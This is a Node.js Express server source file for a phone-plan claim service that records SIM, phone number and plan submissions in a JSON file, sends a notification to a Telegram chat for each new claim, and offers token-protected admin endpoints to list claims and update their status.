require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 5000;

// === Middleware ===
app.use(cors());
app.use(express.json({ limit: '10kb' }));
app.use(express.static('public')); // HTML will be served as static

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: 'Too many requests, try later.'
});
app.use('/api/claim', limiter);

// === Database – simple JSON file ===
const CLAIMS_FILE = path.join(__dirname, 'claims.json');

function readClaims() {
  if (!fs.existsSync(CLAIMS_FILE)) return [];
  return JSON.parse(fs.readFileSync(CLAIMS_FILE, 'utf8'));
}

function writeClaims(claims) {
  fs.writeFileSync(CLAIMS_FILE, JSON.stringify(claims, null, 2));
}

// === Telegram Bot ===
const botToken = process.env.TELEGRAM_BOT_TOKEN;
let bot = null;
if (botToken) {
  bot = new TelegramBot(botToken, { polling: false });
  console.log('Telegram bot ready.');
}

// === API: Submit claim ===
app.post('/api/claim', async (req, res) => {
  const { sim, phone, plan, verification, consent } = req.body;

  // Validate
  if (!sim || !phone || !plan || consent !== true) {
    return res.status(400).json({ success: false, message: 'Missing fields or consent not given.' });
  }
  if (!/^[0-9]{10}$/.test(phone)) {
    return res.status(400).json({ success: false, message: 'Invalid phone number.' });
  }

  const claims = readClaims();
  // Duplicate check
  if (claims.find(c => c.phone === phone)) {
    return res.status(409).json({ success: false, message: 'This phone already claimed.' });
  }

  const newClaim = {
    id: Date.now().toString(36).toUpperCase() + Math.random().toString(36).substr(2, 4).toUpperCase(),
    sim,
    phone,
    plan,
    verification: verification === 'provided' ? true : false,
    consentGiven: true,
    status: 'pending',
    createdAt: new Date().toISOString()
  };

  claims.push(newClaim);
  writeClaims(claims);

  // Telegram notification
  if (bot) {
    const msg = `📱 New Claim #${newClaim.id}\nSIM: ${sim.toUpperCase()}\nPhone: +91 ${phone}\nPlan: ₹${plan}\nVerification: ${verification === 'provided' ? '✅' : '⏭️'}`;
    try {
      await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, msg);
    } catch (e) { console.error('Telegram error:', e.message); }
  }

  res.json({ success: true, claimId: newClaim.id });
});

// === Admin endpoints (simple token) ===
app.get('/admin/claims', (req, res) => {
  const token = req.headers.authorization;
  if (token !== `Bearer ${process.env.ADMIN_TOKEN}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  res.json(readClaims());
});

app.post('/admin/update', (req, res) => {
  const token = req.headers.authorization;
  if (token !== `Bearer ${process.env.ADMIN_TOKEN}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  const { claimId, status } = req.body;
  if (!['pending','approved','rejected'].includes(status)) {
    return res.status(400).json({ error: 'Invalid status' });
  }
  const claims = readClaims();
  const claim = claims.find(c => c.id === claimId);
  if (!claim) return res.status(404).json({ error: 'Claim not found' });
  claim.status = status;
  writeClaims(claims);
  res.json({ success: true });
});

// Serve the HTML (if not using separate static)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
